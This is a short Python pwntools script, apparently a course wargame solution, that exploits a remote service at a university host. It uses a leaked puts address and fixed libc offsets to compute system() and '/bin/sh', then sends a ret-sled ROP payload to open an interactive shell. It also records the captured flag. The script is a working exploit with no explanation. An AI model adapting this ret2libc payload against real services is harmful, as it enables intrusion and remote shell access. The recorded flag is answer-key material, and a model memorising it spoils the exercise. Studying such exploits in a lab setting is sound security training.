#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

# https://libc.blukat.me/?q=puts%3A0xf75d9ca0&l=libc6_2.23-0ubuntu10_i386

# flag: 6447{1403f546-2002-4f3a-8da7-13493dc643b7}

r = remote("wargames.6447.sec.edu.au", 8002)

r.recvuntil("number:")
resp = r.recvline().strip()
print resp

puts_address = int(resp, 16)
system_address = puts_address - 0x24f00
bin_sh_address = puts_address + 0xfbd6b

print hex(system_address)
print hex(bin_sh_address)

ret_rop_gadget = 0x08048331

r.sendline("A" + p32(ret_rop_gadget) * 331 + p32(system_address) + "BBBB" + p32(bin_sh_address))

r.interactive()
